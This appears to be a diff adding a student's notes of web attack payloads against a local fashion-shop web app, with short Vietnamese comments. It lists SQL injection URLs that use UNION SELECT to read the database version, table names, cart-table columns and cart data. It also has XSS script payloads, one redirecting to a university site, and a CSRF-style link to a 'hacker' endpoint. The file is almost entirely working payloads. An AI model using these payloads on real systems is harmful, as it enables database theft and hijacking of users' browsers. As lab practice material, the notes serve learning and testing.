@@ -1,0 +1,18 @@
+--lay version
+http://localhost:8080/webThoiTrang/profile?action=trang@gmail.com%27%20union%20select%201,@@version%20--
+--Lay thong tin bang trong database:
+http://localhost:8080/webThoiTrang/profile?action=thao@gmail.com%27%20union%20SELECT%201,%20TABLE_NAME%20FROM%20INFORMATION_SCHEMA.TABLES%20--
+--xem ten cac cot trong gio hang:
+http://localhost:8080/webThoiTrang/profile?action=thao@gmail.com%27%20union%20SELECT%201,%20COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%20=%20%27gioHang%27%20--
+--xem thong tin trong gio hang:
+http://localhost:8080/webThoiTrang/profile?action=thao@gmail.com%27%20union%20select%20ma,%20giaMoi%20FROM%20giohang--
+
+--xss
+<Script>alert("hihi");</Script>
+
+<Script>window.location="http://uis.ptithcm.edu.vn/"</Script>
+
+
+-csrf:
+<a href="http://localhost:8080/WEB_HACKER/hacker_ne?text=chao mung ban den ser hacker" title="hacker" target="_blank">xem ne</a>
+    
